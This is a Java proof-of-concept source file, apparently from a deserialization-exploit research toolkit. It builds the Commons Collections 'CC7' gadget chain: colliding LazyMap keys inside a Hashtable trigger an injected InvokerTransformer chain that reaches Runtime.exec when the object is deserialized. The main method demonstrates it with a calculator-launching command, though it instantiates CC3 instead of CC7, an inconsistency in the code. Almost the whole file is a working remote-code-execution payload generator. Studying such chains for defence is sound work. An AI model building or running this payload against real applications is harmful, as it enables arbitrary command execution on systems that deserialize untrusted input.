package xyz.eki.marshalexp.poc;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import xyz.eki.marshalexp.gadget.cc.GCC;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/*
    Payload method chain:
    java.util.Hashtable.readObject
    java.util.Hashtable.reconstitutionPut
    org.apache.commons.collections.map.AbstractMapDecorator.equals
    java.util.AbstractMap.equals
    org.apache.commons.collections.map.LazyMap.get
    org.apache.commons.collections.functors.ChainedTransformer.transform
    org.apache.commons.collections.functors.InvokerTransformer.transform
    java.lang.reflect.Method.invoke
    sun.reflect.DelegatingMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke
    sun.reflect.NativeMethodAccessorImpl.invoke0
    java.lang.Runtime.exec
*/
public class CC7 implements POC{
    public Hashtable getObject(final String cmd) throws Exception {

        // Reusing transformer chain and LazyMap gadgets from previous payloads

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});


        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        ReflectUtils.setFieldValue(transformerChain, "iTransformers", GCC.invokerTransformer2RCE(cmd));

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");

        return hashtable;
    }

    public static void main(String[] args) throws Exception{
        String cmd= "open /System/Applications/Calculator.app";
        Object poc = new CC3().getPocObject(cmd);
        SerializeUtils.deserialize(SerializeUtils.serialize(poc));
    }
}
